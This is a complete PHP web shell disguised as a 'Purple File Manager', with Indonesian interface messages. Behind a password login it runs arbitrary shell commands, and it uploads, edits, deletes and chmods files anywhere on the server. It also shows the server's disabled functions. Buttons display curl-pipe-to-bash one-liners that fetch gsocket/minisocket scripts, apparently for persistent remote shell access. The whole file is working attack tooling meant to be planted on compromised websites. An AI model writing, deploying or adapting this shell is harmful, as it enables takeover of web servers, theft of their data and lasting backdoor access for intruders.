<?php
error_reporting(0);
session_start();
$APP_NAME = "Purple File Manager";
$BASE_PATH = getcwd();


$PASSWORD_MD5 = "35eef1ad5e3b24162e2bfeb325250ec8";


if(isset($_POST['login'])){
    $pass = $_POST['password'];
    if(md5($pass) === $PASSWORD_MD5){
        $_SESSION['logged_in'] = true;
        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    } else {
        $msg = "Password salah!";
    }
}


if(isset($_GET['logout'])){
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}


if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true){
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title><?=$APP_NAME?> - Login</title>
        <style>
            body{background:#0d0d0d;color:#eee;font-family:monospace;text-align:center;padding-top:100px;}
            input{padding:6px;margin:5px;border-radius:4px;border:none;}
            input[type=password]{width:200px;}
            input[type=submit]{background:#7d3c98;color:#fff;cursor:pointer;}
            .msg{color:#e74c3c;margin-top:10px;}
        </style>
    </head>
    <body>
        <h1><?=$APP_NAME?></h1>
        <form method="POST">
            Password: <input type="password" name="password"><br>
            <input type="submit" name="login" value="Login">
        </form>
        <?php if(isset($msg)) echo "<div class='msg'>$msg</div>"; ?>
    </body>
    </html>
    <?php
    exit;
}


function perms($file){ return substr(sprintf('%o', fileperms($file)),-3); }

function exe($cmd){
    if(function_exists('shell_exec')) return shell_exec($cmd);
    elseif(function_exists('exec')){exec($cmd,$o);return implode("\n",$o);}
    elseif(function_exists('system')){ob_start();system($cmd);$o=ob_get_clean();return $o;}
    elseif(function_exists('passthru')){ob_start();passthru($cmd);$o=ob_get_clean();return $o;}
    return "Command execution not available.";
}

$path = isset($_GET['path']) ? $_GET['path'] : $BASE_PATH;
$path = str_replace("\\","/",$path);
$paths = explode("/",$path);
$search = isset($_GET['search']) ? strtolower($_GET['search']) : "";

$msg="";
if(isset($_FILES['file'])){
    $dest = $path.'/'.$_FILES['file']['name'];
    $msg = copy($_FILES['file']['tmp_name'],$dest) ? "Upload Berhasil: {$_FILES['file']['name']}" : "Upload Gagal";
}
if(isset($_POST['newfile'])){ file_put_contents($path.'/'.$_POST['newfile'],""); $msg="File dibuat"; }
if(isset($_POST['newfolder'])){ mkdir($path.'/'.$_POST['newfolder']); $msg="Folder dibuat"; }
if(isset($_POST['delete'])){ $t=$_POST['target']; is_dir($t)?@rmdir($t):@unlink($t); $msg="Dihapus: $t"; }
if(isset($_POST['rename'])){ rename($_POST['oldname'],$path.'/'.$_POST['newname']); $msg="Rename berhasil"; }
if(isset($_POST['chmod'])){ chmod($_POST['target'],octdec($_POST['perm'])); $msg="Chmod berhasil"; }
if(isset($_POST['savefile'])){ file_put_contents($_POST['target'],$_POST['src']); $msg="File disimpan"; }

$terminal_output="";
$terminal_show = isset($_POST['toggle_terminal']) ? !empty($_POST['toggle_terminal']) : false;
if(isset($_POST['execmd'])){ $terminal_output = exe($_POST['cmd']); $terminal_show = true; }

?>
<!DOCTYPE html>
<html>
<head>
<title><?=$APP_NAME?></title>
<style>
body{font-family:monospace;background:#0d0d0d;color:#eee;margin:0;}
h1{color:#7d3c98;text-align:center;padding:15px 0;margin:0;font-size:28px;} /* purple gelap */
a{color:#1abc9c;text-decoration:none;}a:hover{color:#f1c40f;}
table{width:95%;margin:auto;border-collapse:collapse;font-size:14px;}
th,td{border:1px solid #444;padding:8px;text-align:left;position:relative;}
th{background:#7d3c98;color:#fff;} /* purple gelap */
tr:nth-child(even){background:#111;}
tr:hover{background:#222;}
input,textarea,select,button{background:#222;color:#1abc9c;border:1px solid #555;border-radius:4px;padding:4px;}
textarea{width:95%;height:250px;}
button.action-btn{background:#7d3c98;color:#fff;border:none;padding:3px 6px;cursor:pointer;border-radius:3px;font-size:13px;} /* purple gelap */
td{position:relative;} /* agar menu absolute relatif ke td */
.floating-menu{
    position:absolute;
    top:100%;
    left:0;
    background:#222;
    border:1px solid #555;
    padding:5px;
    border-radius:4px;
    min-width:140px;
    display:none;
    box-shadow:0 0 5px rgba(0,0,0,0.7);
    z-index:100;
}
.floating-menu form{margin:0;padding:3px 0;}
.floating-menu form input{width:100%;margin:2px 0;}
.perm-code{color:#3498db;} 
#terminalBox{position:fixed;top:10px;right:10px;width:420px;background:#111;border:1px solid #7d3c98;padding:10px;z-index:1000;display:<?=$terminal_show?'block':'none'?>;border-radius:6px;box-shadow:0 0 10px #7d3c98;}
#terminalBox h3{margin:0 0 5px 0;color:#f1c40f;}
#terminalBox button{float:right;background:red;color:#fff;border:none;padding:2px 6px;border-radius:3px;cursor:pointer;}
.breadcrumb a{margin-right:5px;color:#1abc9c;} 
.breadcrumb a:hover{color:#f1c40f;}
.msg-box{margin-top:5px;padding:5px;background:#111;border:1px solid #24ff03;border-radius:4px;color:#24ff03;}
.server-btn{background:#1abc9c;color:#111;padding:3px 6px;margin-right:4px;border:none;border-radius:3px;cursor:pointer;}
#toggleTerminalBtn{background:#f39c12;color:#111;border:none;padding:3px 6px;border-radius:3px;cursor:pointer;margin-left:5px;}

.modal{
    display:none;
    position:fixed;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    background:#111;
    border:1px solid #7d3c98;
    border-radius:6px;
    padding:10px;
    z-index:2000;
    width:80%;
    max-width:600px;
    box-shadow:0 0 15px #7d3c98;
}
.modal textarea{width:100%;height:300px;}
.modal h3{color:#f1c40f;margin:0 0 5px 0;}
.modal .close{color:red;cursor:pointer;float:right;font-size:16px;}
</style>
<script>
function toggleActionMenu(id){
    let menu = document.getElementById(id);
    if(menu.style.display=='block'){ menu.style.display='none'; } 
    else { document.querySelectorAll('.floating-menu').forEach(m=>m.style.display='none'); menu.style.display='block'; }
}
function openEditModal(id){ document.getElementById(id).style.display='block'; }
function closeEditModal(id){ document.getElementById(id).style.display='none'; }
function toggleTerminal(){ var t=document.getElementById('terminalBox'); t.style.display=(t.style.display=='block')?'none':'block'; }
document.addEventListener('click', function(e){
    if(!e.target.closest('.floating-menu') && !e.target.classList.contains('action-btn')){
        document.querySelectorAll('.floating-menu').forEach(m=>m.style.display='none');
    }
});
</script>
</head>
<body>
<h1><?=$APP_NAME?> | <a href="?logout=1" style="color:#e74c3c;font-size:14px;">Logout</a></h1>

<!-- Terminal -->
<div id="terminalBox">
  <button onclick="toggleTerminal()">[X]</button>
  <h3>Terminal</h3>
  <form method="POST">
    <input type="text" size="30" name="cmd">
    <input type="submit" name="execmd" value="Run">
    <input type="hidden" name="toggle_terminal" value="1">
  </form>
  <?php if($terminal_output) echo "<textarea readonly>$terminal_output</textarea>"; ?>
</div>

<!-- Server Info -->
<div style="margin:10px;padding:10px;background:#111;border:1px solid #7d3c98;border-radius:6px;">
<b>Server Info</b><br>
PHP: <?=phpversion();?><br>
Disable: <?=ini_get('disable_functions')?><br>
Path: <?=$path?><br>
Disk: <?=round(disk_free_space($path)/1024/1024,2)?> MB / <?=round(disk_total_space($path)/1024/1024,2)?> MB
<form method="POST" style="margin-top:5px;">
<input type="submit" class="server-btn" name="show_gsocket" value="Show GSocket">
<input type="submit" class="server-btn" name="show_minisocket" value="Show MiniSocket">
<button type="button" id="toggleTerminalBtn" onclick="toggleTerminal()">Toggle Terminal</button>
</form>
<?php
if(isset($_POST['show_gsocket'])) echo "<textarea readonly>bash -c \"\$(curl -fsSL https://gsocket.io/y)\" </textarea>";
if(isset($_POST['show_minisocket'])) echo "<textarea readonly>bash -c \"\$(curl -fsSL https://minisocket.io/bin/x)\" </textarea>";
?>
</div>

<!-- Breadcrumb -->
<div class="breadcrumb" style="margin:10px;">
<?php
foreach($paths as $id=>$pat){
    if($pat==''&&$id==0){echo '<a href="?path=/">/</a>';continue;}
    if($pat=='')continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){echo $paths[$i]; if($i!=$id)echo "/";}
    echo '">'.$pat.'</a>/';
}
?>
</div>

<!-- Upload & Create -->
<div style="margin:10px;padding:5px;background:#111;border:1px solid #7d3c98;border-radius:6px;">
<form enctype="multipart/form-data" method="POST" style="margin-bottom:4px;">Upload: <input type="file" name="file"><input type="submit" value="Go"></form>
<form method="POST" style="margin-bottom:4px;">New File: <input type="text" name="newfile"><input type="submit" value="Create"></form>
<form method="POST">New Folder: <input type="text" name="newfolder"><input type="submit" value="Create"></form>
<?php if($msg) echo "<div class='msg-box'>$msg</div>";?>
</div>

<!-- Search -->
<div style="margin:10px;">
<form method="GET">
<input type="hidden" name="path" value="<?=$path?>">
Search: <input type="text" name="search" value="<?=htmlspecialchars($search)?>">
<input type="submit" value="Find">
</form>
</div>

<!-- File Manager -->
<div id="content">
<table>
<tr><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>
<?php
$scandir=scandir($path); $folders=[]; $files=[];
foreach($scandir as $f){ if($f=="."||$f=="..") continue; if($search && stripos($f,$search)===false) continue; if(is_dir($path.'/'.$f)) $folders[]=$f; else $files[]=$f; }

function renderRow($full,$f,$isFolder=false){
    $size = $isFolder?'--':(filesize($full)>=1024*1024?round(filesize($full)/1024/1024,2)." MB":round(filesize($full)/1024,2)." KB");
    $id = 'menu_'.md5($full);
    $editModal = 'editModal_'.md5($full);
    echo"<tr>
        <td>".($isFolder?"<a href='?path=$full'>$f</a>":$f)."</td>
        <td>$size</td>
        <td class='perm-code'>".perms($full)."</td>
        <td>
        <button class='action-btn' onclick=\"toggleActionMenu('$id')\">Action</button>
        <div class='floating-menu' id='$id'>
            <form method='POST'><input type='hidden' name='target' value='$full'><input type='submit' name='delete' value='Delete'></form>
            <form method='POST'><input type='hidden' name='oldname' value='$full'>Rename: <input type='text' name='newname'><input type='submit' name='rename' value='Go'></form>
            <form method='POST'><input type='hidden' name='target' value='$full'>Chmod: <input type='text' name='perm' value='".perms($full)."'><input type='submit' name='chmod' value='Go'></form>";
    if(!$isFolder) echo "<button type='button' onclick=\"openEditModal('$editModal')\">Edit</button></div>";

    if(!$isFolder){
        echo "<div class='modal' id='$editModal'>
            <span class='close' onclick=\"closeEditModal('$editModal')\">&times;</span>
            <h3>Edit File: $full</h3>
            <form method='POST'>
            <textarea name='src'>".htmlspecialchars(file_get_contents($full))."</textarea><br>
            <input type='hidden' name='target' value='$full'>
            <input type='submit' name='savefile' value='Save'>
            </form>
        </div>";
    }
    echo "</td></tr>";
}

foreach($folders as $f) renderRow($path.'/'.$f,$f,true);
foreach($files as $f) renderRow($path.'/'.$f,$f,false);
?>
</table>
</div>
</body>
</html>
